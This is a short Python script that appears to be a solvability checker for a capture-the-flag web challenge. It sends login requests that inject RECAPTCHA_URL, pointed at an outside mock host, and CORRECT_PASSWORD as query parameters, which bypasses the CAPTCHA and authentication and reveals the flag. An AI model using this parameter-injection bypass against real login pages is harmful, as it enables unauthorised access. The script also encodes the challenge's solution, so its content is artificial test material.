import requests

def check(HOST="172.17.0.5"):
    def no_bypass():
        if requests.get(f"http://{HOST}/login.php?password=x&g-recaptcha-response=x").content == b'Stop! Big hacker':
            print("OK")
        else:
            print("recaptcha bypass")

    def bypass():
        res = requests.get(f"http://{HOST}/login.php?g-recaptcha-response=1" \
            "&password=1&RECAPTCHA_URL=http://wectf-dev-koto.free.beeceptor.com/?id=").content
        if res == b"Wrong password :(":
            print("OK")
        else:
            print("Can't bypass recaptcha")

    def check_pass():
        res = requests.get(f"http://{HOST}/login.php?g-recaptcha-response=1" \
            "&password=1&RECAPTCHA_URL=http://wectf-dev-koto.free.beeceptor.com/?id=&CORRECT_PASSWORD=1").content
        if b'we{' in res:
            print("OK")
        else:
            print("Cannot see flag")
    no_bypass()
    bypass()
    check_pass()


check()        
